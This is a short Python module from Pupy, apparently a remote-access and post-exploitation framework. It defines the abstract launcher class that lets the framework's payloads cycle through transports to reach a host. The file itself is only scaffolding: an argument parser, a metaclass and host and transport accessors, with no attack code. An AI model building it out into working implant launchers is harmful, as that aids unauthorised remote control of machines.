# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
"""
launchers bring an abstraction layer over transports to allow pupy payloads to try multiple transports until one succeed or perform custom actions on their own.
"""

__all__ = (
    'LauncherError', 'LauncherArgumentParser', 'BaseLauncher'
)

import argparse
import sys

class LauncherError(Exception):
    __slots__ = ()

class LauncherArgumentParser(argparse.ArgumentParser):
    __slots__ = ()

    def __init__(self, *args, **kwargs):
        argparse.ArgumentParser.__init__(self, *args, **kwargs)

    def exit(self, status=0, message=None):
        raise LauncherError(message)

    def error(self, message):
        self.exit(2, str('%s: error: %s\n') % (self.prog, message))

class BaseLauncherMetaclass(type):
    def __init__(self, *args, **kwargs):
        super(BaseLauncherMetaclass, self).__init__(*args, **kwargs)

        self.transports = getattr(sys, 'pupy_transports', {})
        self.init_argparse()

class BaseLauncher(object):
    arg_parser = None
    args = None
    transports = None

    __slots__ = ('args', 'host', 'transport')
    __metaclass__ = BaseLauncherMetaclass

    def __init__(self):
        self.args = None
        self.host = "unknown"
        self.transport = "unknown"

    def iterate(self):
        """ iterate must be an iterator returning rpyc stream instances"""
        raise NotImplementedError("iterate launcher's method needs to be implemented")

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(
            prog=cls.__name__, description=cls.__doc__)

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)

    def set_host(self, host):
        self.host = host

    def get_host(self):
        return self.host

    def set_transport(self, t):
        self.transport = t

    def get_transport(self):
        return self.transport
